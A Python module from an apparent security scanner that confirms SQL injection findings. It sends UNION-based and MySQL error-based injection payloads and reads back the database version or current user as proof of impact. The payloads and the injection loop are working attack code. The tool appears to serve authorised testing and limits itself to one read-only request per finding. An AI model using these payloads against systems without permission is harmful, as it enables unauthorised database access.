"""Bounded, read-only impact proofs for confirmed findings.

A confirmed finding says a bug *exists* ("this parameter is injectable"). This
module takes one more safe step: it demonstrates minimum impact with a concrete,
read-only example ("arbitrary SQL runs -- here is the database version") so the
report shows theoretical impact, not just a technical signal. It never dumps
data, writes, or weaponizes: one bounded read per finding.

Currently proves SQL injection (the class where "injectable" most understates
impact). Other confirmed classes already demonstrate impact in their own
evidence: SSRF via an out-of-band callback, path traversal via /etc/passwd
contents, LFI via a rot13'd file read.
"""

from __future__ import annotations

import re
from typing import Any

import httpx

from shroodler.probes.common import body_text, inject, normalize_params

# Split sentinel: the payload contains the two halves as separate string
# literals, so they only appear joined ("SHRDLRIMPACT") when the database
# actually concatenates them -- a reflected payload cannot produce the join.
_S_A = "SHRDLR"
_S_B = "IMPACT"
_SENTINEL = _S_A + _S_B

# version/user expressions across common engines.
_EXPRS = ("version()", "@@version", "sqlite_version()", "current_user")


def _union_payloads() -> list[str]:
    out: list[str] = []
    for expr in _EXPRS:
        concat = f"concat('{_S_A}','{_S_B}',{expr})"
        # 1-3 column UNIONs (column count must match the original query).
        out.append(f"' UNION SELECT {concat}-- -")
        out.append(f"' UNION SELECT null,{concat}-- -")
        out.append(f"' UNION SELECT null,null,{concat}-- -")
    # MySQL error-based (no column-count needed).
    out.append(f"' AND extractvalue(1,concat(0x7e,'{_S_A}','{_S_B}',version()))-- -")
    return out


def _proof_from_body(body: str) -> str | None:
    """Return the text just after the joined sentinel (the DB version/user)."""
    idx = body.find(_SENTINEL)
    if idx < 0:
        return None
    tail = body[idx + len(_SENTINEL) : idx + len(_SENTINEL) + 80]
    # Trim at the first delimiter a response/error would add around it.
    tail = re.split(r"['\"<>~)\n\r]", tail, maxsplit=1)[0].strip()
    return tail or "(empty)"


def prove_sqli(
    url: str,
    param: str,
    cookie_header: str = "",
    *,
    method: str = "GET",
    client: httpx.Client | None = None,
    pacer: Any = None,
) -> str | None:
    """One bounded read-only proof that arbitrary SQL executes.

    Returns the extracted DB version/user string (the impact proof), or None.
    """
    if not url or not param:
        return None
    normalized = normalize_params([{"name": param, "value": "1"}])
    for payload in _union_payloads():
        resp = inject(
            url,
            method,
            normalized,
            param,
            payload,
            cookie_header=cookie_header,
            client=client,
            pacer=pacer,
        )
        if resp is None:
            continue
        proof = _proof_from_body(body_text(resp))
        if proof:
            return proof
    return None


_PARAM_RE = re.compile(r"param=([A-Za-z0-9_.\-\[\]]+)")


def _param_of(finding: Any) -> str:
    evidence = str(getattr(finding, "evidence", "") or "")
    match = _PARAM_RE.search(evidence)
    return match.group(1) if match else ""


def annotate_impact(
    findings: list[Any],
    *,
    cookie_header: str = "",
    client: httpx.Client | None = None,
    pacer: Any = None,
) -> int:
    """Attach an IMPACT proof to confirmed SQLi findings. Returns how many were
    annotated. Read-only and bounded; never raises."""
    annotated = 0
    for finding in findings or []:
        fid = str(getattr(finding, "id", "") or "")
        conf = str(getattr(finding, "confidence", "") or "")
        if conf != "confirmed" or not fid.startswith("sqli"):
            continue
        if "IMPACT:" in str(getattr(finding, "evidence", "") or ""):
            continue  # already proven
        param = _param_of(finding)
        if not param:
            continue
        try:
            proof = prove_sqli(
                str(getattr(finding, "url", "") or ""),
                param,
                cookie_header,
                client=client,
                pacer=pacer,
            )
        except Exception:  # noqa: BLE001 - impact proof must never break a run
            proof = None
        if not proof:
            continue
        note = f" IMPACT: arbitrary SQL executes; read back DB version/user = {proof!r}"
        try:
            finding.evidence = str(getattr(finding, "evidence", "") or "") + note
        except Exception:  # noqa: BLE001
            continue
        annotated += 1
    return annotated
